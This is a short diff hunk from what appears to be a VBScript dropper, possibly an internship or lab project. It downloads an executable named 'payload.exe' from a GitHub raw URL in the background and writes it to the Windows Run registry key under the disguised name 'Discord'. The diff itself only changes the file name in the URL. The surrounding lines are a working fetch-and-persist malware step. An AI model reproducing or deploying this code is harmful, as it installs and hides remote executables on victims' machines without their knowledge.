@@ -48,7 +48,7 @@
             exePath = desktopPath & "payload.exe"
             
             ' Download EXE (background)
-            DownloadFile "https://raw.githubusercontent.com/afnan53/internship/main/target_windows.exe", exePath
+            DownloadFile "https://raw.githubusercontent.com/afnan53/internship/main/traget_windows.exe", exePath
             
             ' Add to startup registry
             shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Discord", Chr(34) & exePath & Chr(34), "REG_SZ"
